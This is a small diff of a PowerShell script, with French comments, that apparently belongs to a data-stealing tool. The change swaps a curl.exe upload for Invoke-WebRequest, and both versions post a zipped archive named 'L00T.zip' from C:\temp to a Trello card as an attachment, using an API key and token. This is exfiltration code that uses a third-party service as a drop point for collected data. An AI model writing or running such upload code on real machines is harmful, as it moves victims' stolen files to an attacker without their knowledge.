@@ -129,7 +129,9 @@ $attachmentUrl = "https://api.trello.com/1/cards/$cardId/attachments"
 $filePath = "C:\temp\$zipFileName"
 
 # Envoi de la requête POST avec curl pour télécharger le fichier
-& "curl.exe" -sS --request POST --url "$attachmentUrl" --form "key=$key" --form "token=$token" --form "file=@C:\temp\L00T.zip"
+# & "curl.exe" -sS --request POST --url "$attachmentUrl" --form "key=$key" --form "token=$token" --form "file=@C:\temp\L00T.zip"
+Invoke-WebRequest -Uri $attachmentUrl -Method POST -Headers @{ "key" = $key; "token" = $token } -InFile "C:\temp\L00T.zip"
+
 
 
 }
